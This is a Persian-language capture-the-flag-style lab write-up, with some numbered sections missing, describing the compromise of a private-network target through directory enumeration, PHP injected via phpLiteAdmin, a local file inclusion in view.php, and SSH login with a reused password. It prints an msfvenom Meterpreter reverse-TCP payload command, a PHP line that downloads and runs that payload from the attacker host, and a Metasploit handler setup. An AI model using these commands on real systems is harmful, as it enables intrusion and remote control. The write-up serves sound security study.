## ۳. شناسایی مسیرها و فایل‌های وب

در مرحله بعد، برای پیدا کردن مسیرها و فایل‌های قابل دسترس روی وب‌سرور از ابزار **DIRB** استفاده کردم:

```bash
dirb http://192.168.43.200
```

این اسکن مسیرهای مختلفی از جمله `/css/`، `/dbadmin/`، `/img/`، `/js/` و `/vendor/` را پیدا کرد. همچنین مسیرهای `/index`، `/index.html`، `/LICENSE`، `/package`، `/server-status`، `/tools` و `/view` نیز در خروجی دیده شدند.

موردی که بیشتر از بقیه توجهم را جلب کرد مسیر **`/dbadmin/`** بود. ابزار DIRB اعلام کرد که فهرست محتویات این پوشه قابل مشاهده است (Directory Listing). به همین دلیل، این مسیر را به‌عنوان یکی از موارد مهم برای بررسی بیشتر در نظر گرفتم.

در خروجی، مسیرهای `/cgi-bin/` و `/server-status` کد HTTP 403 برگرداندند؛ درحالی‌که مسیرهای `/index`، `/index.html`، `/LICENSE`، `/package` و `/tools` با کد HTTP 200 پاسخ دادند.

![خروجی شناسایی مسیرها با DIRB](screenshots/3.png)

## ۸. آماده‌سازی دستور در دیتابیس

در phpLiteAdmin فایل دیتابیس `/usr/databases/ls.php` را انتخاب کردم و فرم افزودن یک ردیف به جدول `a` را باز کردم. سپس در فیلد `a` که نوع آن `integer` نمایش داده می‌شد، قطعه‌کد PHPای وارد کردم که برای نمایش محتویات مسیر `/tmp` در نظر گرفته شده است.

کد PHP واردشده در فیلد `a` به این صورت بود:

```php
<?php system("ls /tmp") ?>
```

هدف این دستور نمایش محتویات مسیر `/tmp` است. تصویر، کد واردشده را مستند می‌کند؛ اما اجرای آن یا خروجی دستور را ثابت نمی‌کند. مرحله اجرا و نتیجه واقعی را پس از بررسی جداگانه اضافه می‌کنم.

![وارد کردن قطعه‌کد PHP در phpLiteAdmin](screenshots/7.png)


## ۹. بررسی پارامتر `page`

رفتار بارگذاری صفحه در فایل `view.php` را بررسی کردم. در درخواست عادی، پارامتر `page` برای بارگذاری فایل `tools.html` استفاده می‌شد:

`http://192.168.43.200/view.php?page=tools.html`

تصویر اول وضعیت صفحه را پیش از تغییر مقدار این پارامتر نشان می‌دهد.

![بارگذاری tools.html در view.php](screenshots/8.png)

سپس مقدار پارامتر را تغییر دادم و مسیر نسبی فایل PHPای را وارد کردم که پیش‌تر ساخته بودم. این مسیر به فایل `/usr/databases/ls.php` می‌رسد:

```text
http://192.168.43.200/view.php?page=../../usr/databases/ls.php
```

تصویر بعدی پاسخ سرور پس از ارسال این درخواست را نشان می‌دهد. خروجی مشاهده‌شده با اجرای کد PHP موجود در فایل `ls.php` و اجرای دستور `ls /tmp` سازگار است.

![نتیجه درخواست ls.php از طریق پارامتر page](screenshots/9.png)

بنابراین در این آزمایش مشخص شد که می‌توان مقدار پارامتر `page` را دست‌کاری کرد تا فایلی PHP خارج از مسیر مورد انتظار بارگذاری شود و فایل ارجاع‌داده‌شده خروجی اجرای دستور را برگرداند. بااین‌حال، این آزمایش به‌تنهایی ثابت نمی‌کند که **هر فایل دلخواهی** قابل بارگذاری یا اجراست؛ برای چنین ادعایی به آزمایش‌های بیشتری نیاز است.

## ۱۰. ساخت و میزبانی Payload متِرپرتر

![تصویر ۱۰: ساخت payload متِرپرتر و اجرای Apache](screenshots/10.png)

پس از آزمایش قبلی، با استفاده از ابزار `msfvenom` یک payload از نوع Meterpreter Reverse TCP برای لینوکس با معماری x86 ساختم. آدرس برگشت به ماشین کالی با IP برابر `192.168.43.220` و پورت `444` تنظیم شد و فایل خروجی با فرمت ELF و نام `IM_HERE` در مسیر ریشه وب‌سرور Apache ذخیره شد:

```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=192.168.43.220 lport=444 -f elf > /var/www/html/IM_HERE
```

Metasploit به‌صورت خودکار پلتفرم Linux و معماری x86 را انتخاب کرد. اندازه payload برابر ۱۲۳ بایت و اندازه نهایی فایل ELF برابر ۲۰۷ بایت گزارش شد.

سپس وجود فایل را در مسیر مشخص‌شده بررسی کردم:

```bash
ls /var/www/html/IM_HERE
```

در ادامه سرویس Apache را اجرا کردم:

```bash
systemctl start apache2.service
```

در پایان این مرحله، payload ساخته شده و در مسیر قابل ارائه توسط وب‌سرور قرار گرفته بود و Apache نیز برای ارائه فایل از طریق HTTP راه‌اندازی شده بود. این دستورات **ثابت نمی‌کنند** که ماشین هدف فایل را دانلود یا اجرا کرده است یا یک نشست برگشتی Meterpreter برقرار شده است. برای ثبت چنین نتیجه‌ای به شواهد جداگانه نیاز است و فقط در صورت تأیید، آن را در گزارش اضافه می‌کنم.



## ۱۱. آماده‌سازی دستور دانلود و اجرای Payload در PHP

به فایل `code.php` که پیش‌تر ایجاد کرده بودم برگشتم و یک دستور PHP در آن قرار دادم. هدف این دستور، دریافت payload متِرپرتر از ماشین کالی، ذخیره آن با نام `IM_HERE` در مسیر `/tmp`، دادن مجوز اجرا و سپس اجرای فایل است.

کدی که وارد کردم:

```php
<?php system("wget -O /tmp/IM_HERE http://192.168.43.220/IM_HERE ; cd /tmp ; chmod 777 IM_HERE; ./IM_HERE");?>
```

دستور `wget` فایل را در مسیر `/tmp/IM_HERE` ذخیره می‌کند. دستورات بعدی مسیر کاری را به `/tmp` تغییر می‌دهند، مجوزهای فایل را تغییر می‌دهند و در نهایت تلاش می‌کنند فایل دانلودشده را اجرا کنند.

![تصویر ۱۱: آماده‌سازی دستور PHP در فایل code.php](screenshots/11.png)


این تصویر، دستور واردشده در فایل PHP را مستند می‌کند؛ اما به‌تنهایی ثابت نمی‌کند که کد PHP اجرا شده، payload با موفقیت دانلود یا اجرا شده، یا نشست برگشتی Meterpreter برقرار شده است. نتیجه این موارد را پس از بررسی و تأیید جداگانه ثبت می‌کنم.


## ۱۲. راه‌اندازی Handler متِرپرتر

بعد از ساخت و میزبانی payload، در Metasploit تنظیمات لازم را انجام دادم تا منتظر اتصال برگشتی آن بماند. برای این کار از ماژول `multi/handler` استفاده کردم و تنظیمات آن را با مقادیری که هنگام ساخت فایل `IM_HERE` تعیین کرده بودم، هماهنگ کردم.

ابتدا ماژول Handler را انتخاب کردم:

```text
use exploit/multi/handler
```

این دستور ماژول عمومی Handler را بارگذاری می‌کند؛ ماژولی که برای دریافت اتصال‌های ورودی payloadها استفاده می‌شود.

سپس نوع payload را مطابق payload ساخته‌شده انتخاب کردم:

```text
set payload linux/x86/meterpreter/reverse_tcp
```

با این دستور، Handler برای دریافت اتصال برگشتی Meterpreter با معماری Linux x86 و از طریق TCP تنظیم می‌شود. نوع payload در Handler باید با نوعی که با `msfvenom` ساخته شده مطابقت داشته باشد.

در قدم بعد، آدرس IP ماشین کالی را مشخص کردم:

```text
set lhost 192.168.43.220
```

مقدار `LHOST` آدرسی است که Handler روی ماشین کالی برای دریافت اتصال ورودی استفاده می‌کند.

بعد، پورت موردنظر را تنظیم کردم:

```text
set lport 444
```

مقدار `LPORT` پورت TCPای را مشخص می‌کند که Metasploit روی آن منتظر اتصال می‌ماند. این پورت با پورتی که هنگام ساخت payload تعیین شده بود، یکسان است.

در پایان، Handler را اجرا کردم:

```text
exploit
```

Metasploit پیام زیر را نمایش داد:

```text
[*] Started reverse TCP handler on 192.168.43.220:444
```

این پیام تأیید می‌کند که Handler روی آدرس `192.168.43.220` و پورت `444` شروع به گوش‌دادن کرده است. اما نشان نمی‌دهد که ماشین هدف متصل شده یا نشست Meterpreter برقرار شده باشد.

![تصویر ۱۲: فعال شدن multi-handler متِرپرتر روی پورت ۴۴۴](screenshots/12.png)

## ۱۵. شناسایی سرویس‌های شبکه

قبل از امتحان کردن رمز پیدا‌شده، سرویس‌های در دسترس ماشین هدف را با Nmap بررسی کردم:

```bash
nmap -sV 192.168.43.200
```

اسکن سه پورت TCP باز را نشان داد:

| پورت | وضعیت | سرویس | نسخه |
|---|---|---|---|
| 22/tcp | open | SSH | OpenSSH 5.9p1 Debian 5ubuntu1.10 |
| 80/tcp | open | HTTP | Apache httpd 2.2.22 ((Ubuntu)) |
| 111/tcp | open | rpcbind | 2-4 |

وجود سرویس SSH روی پورت `22` مسیر بعدی را مشخص کرد؛ چون حالا نام کاربری و رمزی برای آزمایش در اختیار داشتم. وب‌سرور روی پورت `80` و سرویس `rpcbind` نیز روی پورت `111` در دسترس بودند.

![تصویر ۱۵: خروجی اسکن نسخه سرویس‌ها با Nmap](screenshots/15.png)

## ۱۶. ورود از طریق SSH

با توجه به شناسایی SSH در اسکن قبلی، تلاش کردم با اطلاعاتی که از فایل تنظیمات WordPress به دست آورده بودم وارد حساب `zico` شوم:

```bash
ssh zico@192.168.43.200
```

در اولین اتصال، SSH پیام تأیید اصالت کلید میزبان را نمایش داد. با وارد کردن `yes` کلید میزبان پذیرفته و سپس درخواست رمز عبور نمایش داده شد. رمز کشف‌شده در فایل تنظیمات WordPress را وارد کردم.

پس از ورود، دستور زیر را اجرا کردم:

```bash
whoami
```

خروجی دستور:

```text
zico
```

این خروجی تأیید کرد که ورود SSH با موفقیت و با سطح دسترسی کاربر محلی `zico` انجام شده است.
